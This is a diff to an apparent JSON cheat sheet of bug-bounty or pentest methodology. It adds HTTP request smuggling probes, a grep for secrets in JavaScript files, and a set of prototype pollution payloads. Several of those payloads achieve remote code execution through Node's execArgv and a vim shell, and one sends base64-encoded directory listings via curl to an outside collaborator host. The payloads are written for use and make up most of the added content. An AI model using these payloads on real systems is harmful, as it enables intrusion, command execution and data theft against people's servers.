@@ -1,6 +1,7 @@
 [
     {
         "title": "Base64 Methodology",
+        "subtitle": "Decode and analyze Base64 encoded data",
         "commands": [
             "cat allurls.txt | gf base64 | tee base64.txt",
             "cat base64.txt | awk -F: '{print $3}' ",
@@ -8,10 +9,104 @@
         ]
     },
     {
-        "title": "SQLi Methodology",
+        "title": "DETECTING CL.TE",
+        "subtitle": "- Timeout means success  <br> - Rejection means the backend is using TE",
         "commands": [
-            "sqlmap -u 'http://target.com/index.php?id=1' --dbs",
-            "sqlmap -u 'http://target.com/index.php?id=1' -D dbname --tables"
+            "Content-Length: 6",
+            "Transfer-Encoding: chunked",
+            "",
+            "3",
+            "abc",
+            "X",
+            ""
+        ]
+    },
+    {
+        "title": "DETECTING TE.CL",
+        "subtitle": "Timeout means success",
+        "commands": [
+            "Content-Length: 6",
+            "Transfer-Encoding: chunked",
+            "",
+            "0",
+            "",
+            "X"
+        ]
+    },
+    {
+        "title": "GREP SECRETS",
+        "subtitle": "Grab secrets from jsfiles",
+        "commands": [
+            "grep -r -E \"aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret|smtp\""
+        ]
+    },
+    {
+        "title": "PROTOTYPE POLLUTION 1",
+        "subtitle": "Tampers with json response spacing",
+        "commands": [
+            "\"__proto__\":{",
+            "  \"json spaces\": 100",
+            "}"
+        ]
+    },
+    {
+        "title": "PAYLOAD 2: CHARSET OVERRIDE",
+        "subtitle": "- Forces the server to render values in UTF-7 encoding if controllable. <br> - Tip: if there is a controllable value and it is reflecting, give it a value converted to utf7. <br> - After that, add the above payload to see if the charset obeyed and rendered the value in utf-7.",
+        "commands": [
+            "\"__proto__\":{",
+            "  \"content-type\": \"application/json; charset=utf-7\"",
+            "}"
+        ]
+    },
+    {
+        "title": "PAYLOAD 3: OVERRIDING THE STATUS",
+        "subtitle": "- Overrides error status returned by the server. <br>- Tip: First send improperly formatted JSON and note the error variable.<br> - Use that variable with __proto__ to override it, then trigger the error again and check if the overridden value exists.",
+        "commands": [
+            "\"__proto__\":{",
+            "  \"status\": 555",
+            "}"
+        ]
+    },
+    {
+        "title": "PAYLOAD 4: USING CONSTRUCTOR",
+        "subtitle": "Injects new properties into the object prototype using constructor.",
+        "commands": [
+            "\"constructor\":{",
+            "  \"prototype\":{",
+            "    \"new\":\"added\"",
+            "  }",
+            "}"
+        ]
+    },
+    {
+        "title": "PAYLOAD 5: REMOTE CODE EXECUTION",
+        "subtitle": "Abuses execArgv to execute system commands remotely.",
+        "commands": [
+            "\"__proto__\": {",
+            "  \"execArgv\":[",
+            "    \"--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')\"",
+            "  ]",
+            "}"
+        ]
+    },
+    {
+        "title": "PAYLOAD 6: RCE USING VIM",
+        "subtitle": "Sets shell to vim and abuses :! command to send request to collaborator.",
+        "commands": [
+            "\"__proto__\":{",
+            "  \"shell\":\"vim\",",
+            "  \"input\":\":!curl https://323s6lgfrgtj5ubwohwljxy0vr1ip8dx.oastify.com\\n\"",
+            "}"
+        ]
+    },
+    {
+        "title": "PAYLOAD 7: EXTRACTING DATA",
+        "subtitle": "Exfiltrates data using vim shell and base64 encoded curl requests.",
+        "commands": [
+            "\"__proto__\":{",
+            "  \"shell\":\"vim\",",
+            "  \"input\":\":!ls | base64 |curl -d @- https://323s6lgfrgtj5ubwohwljxy0vr1ip8dx.oastify.com\\n\"",
+            "}"
         ]
     }
 ]
